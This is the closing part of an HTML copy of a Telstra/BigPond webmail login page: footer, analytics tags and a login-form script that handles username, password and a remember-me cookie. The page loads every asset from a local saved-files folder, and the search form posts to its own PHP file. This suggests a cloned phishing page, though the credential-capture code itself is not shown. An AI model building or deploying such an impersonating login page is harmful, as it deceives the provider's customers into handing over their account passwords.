                                    <div class="itemscope current-page" itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb">
                                        <a href="https://www.telstra.com.au/register" itemprop="url"> <span itemprop="title">Register</span></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            -->

            <div id="scrollup" class="affix-top">
                <div class="container">
                  <div class="scrollup-outer">
                    <a href="#top"><div class="scrollup">Back to top</div></a>
                  </div>
                </div>
            </div>

            <div class="footer-links container">
                <div class="system_generated_classes holderjs standard  row content col-25-25-25-25 default">
                    <div class="col first col-25-25-25-25-c0 hidden-xs">
                        <div class="col-wrapper">
                          <ul class="social-icons">
                            <li><a href="https://www.facebook.com/Telstra24x7" aria-label="Facebook"><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                            <li><a href="https://twitter.com/telstra" aria-label="Twitter"><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                            <li><a href="https://www.youtube.com/user/TelstraCorp" aria-label="YouTube"><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                            <li><a href="https://plus.google.com/+Telstra" aria-label="Google+"><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                          </ul>
                          <!-- 
                          <script type="text/javascript">
                              if (localStorage && localStorage.forceDesktop === 'true') {
                                  document.write('<div class="responsive-switch hidden-xs"><i class="td-icon icon-mobile-on-plan"></i> Switch to mobile view</div>');
                              }
                          </script> 
                          -->

                        </div>
                    </div>
                    <div class="col col-25-25-25-25-c1">
                        <div class="col-wrapper">
                            <ul>
                                <li><a href="https://www.telstra.com.au/sitemap" class="header">Telstra.com sitemap</a></li>
                                <li><a href="https://www.telstra.com.au/contact-us">Contact us</a></li>
                                <li><a href="https://www.telstra.com.au/store-locator">Find a store</a></li>
                                <li><a href="http://careers.telstra.com/">Careers</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col col-25-25-25-25-c2">
                        <div class="col-wrapper">
                            <ul>
                                <li><a href="https://www.telstra.com.au/aboutus" class="header">About us</a></li>
                                <li><a href="https://www.telstrawholesale.com.au/">Telstra Wholesale</a></li>
                                <li><a href="https://www.telstraglobal.com/">Telstra Global</a></li>
                                <li><a href="https://www.telstra.com.au/personal/digital-story">Telstra Digital</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="clearfix hidden-lg"></div>
                    <div class="col col-25-25-25-25-c3 last">
                        <div class="col-wrapper">
                            <ul>
                                <li><a href="https://www.telstra.com.au/consumer-advice" class="header">Consumer Advice</a></li>
                                <li><a href="https://www.telstra.com.au/help/critical-information-summaries">Critical Information Summaries</a></li>
                                <li><a href="http://www.telstra.com.au/terms-of-use">Terms of use</a></li>
                                <li><a href="https://www.telstra.com.au/privacy/privacy-statement">Privacy</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col first col-25-25-25-25-c0 visible-xs">
                        <div class="col-wrapper">
                            <ul class="social-icons">
                                <li><a href="https://www.facebook.com/Telstra24x7" aria-label="Facebook"><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                                <li><a href="https://twitter.com/telstra" aria-label="Twitter"><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                                <li><a href="http://www.youtube.com/user/TelstraCorp" aria-label="YouTube"><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                                <li><a href="https://plus.google.com/+Telstra" aria-label="Google+"><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                            </ul>
                            <!--  
                            <script>
                                 if (localStorage && localStorage.forceDesktop === 'true') {
                                     document.write('<div class="responsive-switch hidden-xs"><i class="td-icon icon-mobile-on-plan"></i> Switch to mobile view</div>');
                                 }
                             </script> 
                            -->
                        </div>
                    </div>
                </div>
                <!--
                <div class="visible-xs responsive-switch"><i class="td-icon icon-desk"></i> Switch to the desktop view</div>
                -->
            </div>
        </div>
    </footer>

    
    
    <script>
        var funURL = "https://id.telstra.com.au/forgotten/username/popup?goto=https://email.telstra.com/webmail";
        var fpwURL = "https://id.telstra.com.au/forgotten/password/commonlogin?goto=https://email.telstra.com/webmail";
        var funStandaloneURL = "https://id.telstra.com.au/forgotten/username/standalone?goto=https://email.telstra.com/webmail";
        var fpwStandaloneURL = "https://id.telstra.com.au/forgotten/password/standalone?goto=https://email.telstra.com/webmail";
    </script>

    <script type="text/javascript" src="Telstra%20Login_files/jquery-1.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/jquery_004.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/angular.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/angular-route.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/angular-sanitize.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/angular-resource.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/jquery_002.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/underscore.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/handlebars-v2.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/dropdown.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/bootstrap-hover-dropdown.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/iframeResizer.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/tooltips.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/main.js"></script>
    
    <script>
        $(function() {
            
            
        });
    </script>

    <script src="Telstra%20Login_files/jquery.js"></script>
    <script type="text/javascript" src="Telstra%20Login_files/analytics.js"></script>
    <script src="Telstra%20Login_files/global.js"></script>
    
    <div id="lpButtonDiv"></div>
    <script>
        function show (elem) {
            if (elem.style.display == "block")
                elem.style.display = "none";
            else
                elem.style.display = "block";
        }
        
        function hide (elem) {
            elem.style.display = "none";
        }
    </script>
    
    <div class="servicecomponents cloudservices"></div>
    
    <script type="text/javascript">
        if (typeof s === 'object' && typeof analytics === 'function') {
            analytics();
        }
    </script>

    <script type="text/javascript">
        <!--
        function EnterKeyPress(e) {
            if (!e) var e = window.event;

            if (e.keyCode) code = e.keyCode;
            else if (e.which) code = e.which;

            if (code == 13) {
                if (document.getElementById("username").value.length > 0 && document.getElementById("password").value.length > 0 ) {
                    document.forms['Login'].submit();
                    e.returnValue = false;
                }
            }
        }

        // rememberme cookie setting
        var sDomain = 'bigpond.com';

        aCookies = document.cookie.split(";");
        for (i=0;i<aCookies.length;i++)
        {
            if (aCookies[i].indexOf('BPLoginRememberMe=') > -1)
            {
                document.getElementById("rememberMe").checked = true;
                document.getElementById("username").value = aCookies[i].split("=")[1];
            }
        }

        function setFormFocus()
        {
            if (document.getElementById("username") && (document.getElementById("username").value == null || document.getElementById("username").value == ""))
            {
                document.getElementById("username").focus();
            }
            else if (document.getElementById("rememberMe").checked)
            {
                document.getElementById("password").focus();
            }
        }

        function setCookieForUser()
        {
            var time = new Date();
            time = new Date(time.getFullYear()+10, time.getMonth(), time.getDate());
            document.cookie = "BPLoginRememberMe=;expires=Thu, 02 Nov 1995 00:00:01 UTC;path=/;domain=" + sDomain;
            if(document.getElementById("rememberMe").checked)	
            document.cookie = "BPLoginRememberMe=" + document.getElementById("username").value +";expires=" + time.toGMTString() + ";path=/;domain=" + sDomain;
        }

        //-->
    </script>

    <!-- Load script to automate popups etc. -->
    <script type="text/javascript" src="Telstra%20Login_files/footer.js"></script>   

    <!-- START Nielsen//NetRatings SiteCensus V5.2 -->
    <!-- COPYRIGHT 2006 Nielsen//NetRatings -->
    <script type="text/javascript">
        var _rsCI="bigpond";
        var _rsCG="0";
        var _rsDN="//secure-au.imrworldwide.com/";
        var _rsCC=0;
        if (window.location.hostname.indexOf("onlinebilling") == -1) {
            document.write('<scr' + 'ipt type="text/javascript" src="//secure-au.imrworldwide.com/v52.js"></scr' + 'ipt><noscr' + 'ipt><img src="https://secure-au.imrworldwide.com/cgi-bin/m?ci=bigpond&amp;cg=0" alt=""/></noscr' + 'ipt>');
        }
    </script><script type="text/javascript" src="Telstra%20Login_files/v52.js"></script><noscript><img src="https://secure-au.imrworldwide.com/cgi-bin/m?ci=bigpond&amp;cg=0" alt=""/></noscript>
    
    <!-- END Nielsen//NetRatings SiteCensus V5.2 -->



</div><div id="site-search" class="feature-popover site-search" data-popover-focusto="#telstra-search" data-popover-position="search" data-popover-animate="slide-right" aria-hidden="true" tabindex="-1">
                          <div class="popover-content">
                            <form class="telstra-search" role="search" action="<?php echo basename(__FILE__); ?>" method="post">
                              <input type="text" id="telstra-search" title="telstra-search" name="inpSearch" placeholder="Search Telstra.com" autocomplete="off" spellcheck="false" dir="auto" data-search-input-mobile="">
                                        
                                        
                              <button type="submit" class="btn-search btn square">
                                <i class="td-icon icon-ui-search"></i>
                                <span class="vh">Submit Search</span>
                              </button>
                              <button class="popover-close btn square">
                                <i class="td-icon icon-ui-cross"></i>
                                <span class="vh">Close Search</span>
                              </button>
                            </form>
                          </div>
                        </div><div class="shade-bg">&nbsp;</div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_telstra_0" name="destination_publishing_iframe_telstra_0_name" style="display: none; width: 0px; height: 0px;" src="Telstra%20Login_files/dest5.htm" class="aamIframeLoaded"></iframe><iframe src="Telstra%20Login_files/ls.htm" style="display: none;" id="lsframe" width="0" height="0"></iframe></body></html>